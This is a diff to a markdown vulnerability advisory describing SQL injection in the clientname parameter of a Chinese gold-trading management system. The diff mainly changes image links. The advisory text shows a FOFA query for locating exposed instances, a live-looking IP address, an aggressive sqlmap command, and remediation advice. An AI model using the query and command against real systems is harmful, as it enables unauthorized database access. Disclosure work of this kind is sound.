@@ -4,7 +4,8 @@
 
 fofa ：title="黄金通二级系统三代管理端"
 
-![image-20250601174125078](C:\Users\16523\AppData\Roaming\Typora\typora-user-images\image-20250601174125078.png)
+![image-20250601174125078](https://github.com/user-attachments/assets/c3101135-86b1-4500-825d-5fcb2eacd8c8)
+
 
 官网： https://113.105.126.146:8900/ 
 
@@ -52,8 +53,8 @@ The parameter clientname in the request body is vulnerable to SQL injection.
 ```
 python3 sqlmap.py -r 2.txt --dbs -batch --force-ssl --level 5 --risk 3 --dbms oracle
 ```
+![image-20250601174125078](https://github.com/user-attachments/assets/a57b9c49-4b1f-4589-b48e-31b870a8d10a)
 
-![image-20250601182030382](C:\Users\16523\AppData\Roaming\Typora\typora-user-images\image-20250601182030382.png)
 
 [Mitigation & Fix Recommendations] 
 Implement parameterized queries (precompiled), use stored procedures if securely coded, and apply input validation/filtering.
